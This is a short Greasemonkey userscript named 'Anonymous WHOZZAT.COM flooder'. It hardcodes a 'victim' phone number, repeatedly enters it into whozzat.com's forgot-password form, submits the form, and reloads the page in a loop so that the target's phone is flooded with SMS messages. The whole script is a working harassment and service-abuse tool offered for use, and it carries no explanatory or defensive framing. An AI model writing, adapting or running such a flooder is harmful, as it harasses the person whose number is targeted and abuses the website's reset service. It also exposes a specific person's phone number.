 // ==UserScript==
 // @name          Anonymous WHOZZAT.COM flooder
 // @namespace     SUNNY020
 // @description   flooder sms
 // @include       http://*whozzat.com/*
 // @credits       One
 // ==/UserScript==
 
 var victim=8092262928 //

if(document.location=="http://whozzat.com/forget_password.php"||document.location=="http://whozzat.com/forget_password.php")
{
document.forms[1].elements[0].value=victim;
document.forms[1].submit();
}
if(document.location=="http://whozzat.com/forget_password.php"||document.location=="http://whozzat.com/forget_password.php")
document.location='http://whozzat.com/forget_password.php';